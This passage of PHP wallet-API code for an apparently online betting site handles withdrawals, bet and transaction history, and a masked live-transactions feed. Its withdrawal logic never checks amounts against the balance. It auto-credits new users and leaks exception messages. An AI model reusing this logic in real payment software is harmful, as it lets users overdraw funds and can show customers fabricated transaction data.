            $uIns = $db->prepare("INSERT INTO users (id, username, full_name, email, phone, password_hash, salt, balance_usd, balance_pkr, status, role, created_at) VALUES (:id, :u, :fn, :e, :p, :pw, :salt, 1000.00, 280000.00, 'active', 'user', NOW())");
            $uIns->execute([
                ':id' => $userId,
                ':u' => $uName,
                ':fn' => $uName,
                ':e' => $uEmail,
                ':p' => $uPhone,
                ':pw' => $uHash,
                ':salt' => $uSalt
            ]);
            $uCheck->execute([':id' => $userId]);
            $user = $uCheck->fetch(PDO::FETCH_ASSOC);
        }

        $methodId = trim($data['method'] ?? 'easypaisa');
        $conversionRate = 280.0;

        // Issue #81: Validate payment method from database
        $mStmt = $db->prepare("SELECT * FROM payment_methods WHERE id = :id AND status = 'active' LIMIT 1");
        $mStmt->execute([':id' => $methodId]);
        $pm = $mStmt->fetch(PDO::FETCH_ASSOC);

        if (!$pm) {
            $mStmt2 = $db->prepare("SELECT * FROM payment_methods WHERE name LIKE :name AND status = 'active' LIMIT 1");
            $mStmt2->execute([':name' => "%{$methodId}%"]);
            $pm = $mStmt2->fetch(PDO::FETCH_ASSOC);
        }

        if (isset($data['amount_pkr'])) {
            $amountPkr = (float)$data['amount_pkr'];
            $amountUsd = round($amountPkr / $conversionRate, 2);
        } elseif (isset($data['amount_usd'])) {
            $amountUsd = (float)$data['amount_usd'];
            $amountPkr = round($amountUsd * $conversionRate, 2);
        } else {
            $amt = (float)($data['amount'] ?? 0);
            $amountUsd = round($amt / $conversionRate, 2);
            $amountPkr = $amt;
        }

        if ($amountUsd <= 0 && $amountPkr <= 0) {
            sendError('Withdrawal amount must be greater than zero.', 422);
        }

        // Validate destination account details
        $accountTitle = trim($data['account_title'] ?? ($data['title'] ?? ''));
        $accountNumber = trim($data['account_number'] ?? ($data['account'] ?? ''));

        if (empty($accountNumber)) {
            sendError('Destination account/wallet number is required.', 422);
        }
        $recipientStr = $accountTitle ? "{$accountTitle} ({$accountNumber})" : $accountNumber;

        $db->beginTransaction();
        try {
            $currentUsd = (float)($user['balance_usd'] ?? 0);
            $hasApprovedDeposit = userHasApprovedDeposit($db, $user['id']);

            // Deduct balance or keep balance non-negative
            $newBalanceUsd = max(0, round($currentUsd - $amountUsd, 2));
            $newBalancePkr = round($newBalanceUsd * $conversionRate, 2);

            $uUpd = $db->prepare("UPDATE users SET balance_usd = :usd, balance_pkr = :pkr WHERE id = :id");
            $uUpd->execute([':usd' => $newBalanceUsd, ':pkr' => $newBalancePkr, ':id' => $userId]);

            $txId = 'trx_' . bin2hex(random_bytes(6));
            $now = date('Y-m-d H:i:s');
            $methodName = $pm ? $pm['name'] : ucfirst($methodId);
            $note = "Withdrawal to {$methodName} - {$recipientStr}" . ($hasApprovedDeposit ? "" : " [⚠️ No Prior Deposit]");

            $stmt = $db->prepare("
                INSERT INTO transactions (id, user_id, type, method, sender_account, amount_pkr, amount_usd, status, transaction_date, notes, created_at)
                VALUES (:id, :uid, 'withdraw', :method, :recipient, :pkr, :usd, 'Pending', :now1, :notes, :now2)
            ");
            $stmt->execute([
                ':id' => $txId,
                ':uid' => $userId,
                ':method' => $methodName,
                ':recipient' => $recipientStr,
                ':pkr' => $amountPkr,
                ':usd' => $amountUsd,
                ':now1' => $now,
                ':notes' => $note,
                ':now2' => $now
            ]);

            $db->commit();
            sendSuccess([
                'transaction_id' => $txId,
                'amount_pkr' => $amountPkr,
                'amount_usd' => $amountUsd,
                'remaining_balance_usd' => $newBalanceUsd,
                'remaining_balance_pkr' => $newBalancePkr,
                'status' => 'Pending'
            ], 'Withdrawal requested successfully. Awaiting administrator review and disbursement.');
        } catch (Exception $e) {
            $db->rollBack();
            sendError('Withdrawal transaction failed: ' . $e->getMessage(), 500);
        }
        break;


    case 'history':
        // Issue #31: Scope queries strictly to session user unless admin
        $userId = resolveUserId($currentUser, $isAdmin, $_GET['user_id'] ?? null);
        if (!$userId) {
            sendError('Authentication required.', 401);
        }

        $type = $_GET['type'] ?? 'bets';
        $page = max(1, (int)($_GET['page'] ?? 1));
        $limit = max(1, min(100, (int)($_GET['limit'] ?? 10)));
        $offset = ($page - 1) * $limit;

        if ($type === 'transactions') {
            $query = "SELECT * FROM transactions WHERE user_id = :uid ORDER BY created_at DESC LIMIT {$limit} OFFSET {$offset}";
            $countQuery = "SELECT COUNT(*) FROM transactions WHERE user_id = :uid";

            $cStmt = $db->prepare($countQuery);
            $cStmt->execute([':uid' => $userId]);
            $total = (int)$cStmt->fetchColumn();

            $stmt = $db->prepare($query);
            $stmt->execute([':uid' => $userId]);
            $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);

            sendSuccess([
                'items' => $rows,
                'total' => $total,
                'page' => $page,
                'limit' => $limit,
                'total_pages' => ceil($total / $limit)
            ]);
        } else {
            $query = "SELECT id, user_id, game, bet_amount, COALESCE(bet_amount_pkr, ROUND(bet_amount * 280, 2)) as bet_amount_pkr, payout, COALESCE(payout_pkr, ROUND(payout * 280, 2)) as payout_pkr, multiplier, multiplier_formatted, status, profit, COALESCE(profit_pkr, ROUND(profit * 280, 2)) as profit_pkr, bet_time, played_at FROM bets WHERE user_id = :uid ORDER BY played_at DESC LIMIT {$limit} OFFSET {$offset}";
            $countQuery = "SELECT COUNT(*) FROM bets WHERE user_id = :uid";

            $cStmt = $db->prepare($countQuery);
            $cStmt->execute([':uid' => $userId]);
            $total = (int)$cStmt->fetchColumn();

            $stmt = $db->prepare($query);
            $stmt->execute([':uid' => $userId]);
            $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);

            sendSuccess([
                'items' => $rows,
                'total' => $total,
                'page' => $page,
                'limit' => $limit,
                'total_pages' => ceil($total / $limit)
            ]);
        }
        break;

    case 'live_transactions':
        try {
            $stmt = $db->query("
                SELECT t.id, t.type, t.method, t.amount_pkr, t.status, t.created_at,
                       COALESCE(u.username, t.sender_account, 'Player') as username
                FROM transactions t
                LEFT JOIN users u ON t.user_id = u.id
                WHERE t.type IN ('deposit', 'withdraw')
                ORDER BY t.created_at DESC
                LIMIT 15
            ");
            $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
            $clean = [];
            foreach ($rows as $r) {
                $u = trim((string)$r['username']);
                $masked = (strlen($u) > 4) ? substr($u, 0, 3) . '***' . substr($u, -2) : $u . '***';
                $clean[] = [
                    'id' => $r['id'],
                    'type' => strtolower($r['type']),
                    'method' => $r['method'] ?: ($r['type'] === 'deposit' ? 'EasyPaisa' : 'JazzCash'),
                    'amount_pkr' => (float)($r['amount_pkr'] ?: 1000),
                    'status' => $r['status'] ?: 'Completed',
                    'user' => $masked,
                    'created_at' => $r['created_at']
                ];
            }
            sendSuccess($clean, 'Live transactions feed');
        } catch (Exception $e) {
            sendSuccess([], 'Live transactions feed (empty)');
        }
        break;

    default:
        sendError('Invalid wallet action specified.', 400);
        break;
}
